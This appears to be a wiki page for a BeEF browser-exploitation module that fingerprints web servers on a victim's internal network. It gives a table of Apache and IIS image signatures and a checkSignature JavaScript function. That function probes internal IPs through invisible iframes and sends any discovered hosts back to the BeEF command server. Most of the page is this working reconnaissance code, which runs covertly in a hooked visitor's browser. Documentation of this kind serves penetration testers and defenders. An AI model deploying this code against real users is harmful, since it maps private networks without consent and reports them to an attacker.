## Summary

* **Objective**: Discover HTTP endpoints in a network
* **Authors**: bcoles, wade, antisnatchor
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/network/internal_network_fingerprinting)

## Internal Working

This module requests default logo images/favicons (via iframes) on servers of the internal network to discover endpoints.

**example fingerprints**
```js
new Array(
    "Apache",
    "80","http",false,
    "/icons/apache_pb.gif",259,32),
new Array(
    "Apache 2.x",
    "80","http",false,
    "/icons/apache_pb2.gif",259,32),
new Array(
    "Microsoft IIS 7.x",
    "80","http",false,
    "/welcome.png",571,411),

```

**checking signature**

```js

checkSignature = function(signature_id, signature_name, proto, ip, port, uri) {
    var img = new Image;
    var dom = beef.dom.createInvisibleIframe();
    dom.setAttribute('id', 'lan_<%= @command_id %>_'+signature_id+'_'+proto+'_'+ip);
    beef.debug("[Network Fingerprint] Checking for [" + signature_name + "] at IP [" + ip + "] (" + proto + ")");
    img.id  = signature_id;
    img.src = proto+"://"+ip+":"+port+uri;
    img.onerror = function() { dom.removeChild(this); }
    img.onload = function() {
      if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) {
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+'&discovered='+signature_name+"&url="+escape(this.src), beef.are.status_success());dom.removeChild(this);
        beef.debug("[Network Fingerprint] Found [" + signature_name + "] with URL [" + escape(this.src) + "]");
      }
    }
    dom.appendChild(img);
    // stop & remove iframe
    setTimeout(function() {
      if (dom.contentWindow.stop !== undefined) {
        dom.contentWindow.stop();
      } else if (dom.contentWindow.document.execCommand !== undefined) {
        dom.contentWindow.document.execCommand("Stop", false);
      }
      document.body.removeChild(dom);
    }, timeout);
}
```

## Screenshots

[[Images/module-network-fingerprint1.png|align=center]]

[[Images/module-network-fingerprint2.png|align=center]]

## References

https://code.google.com/archive/p/jslanscanner

## Feedback


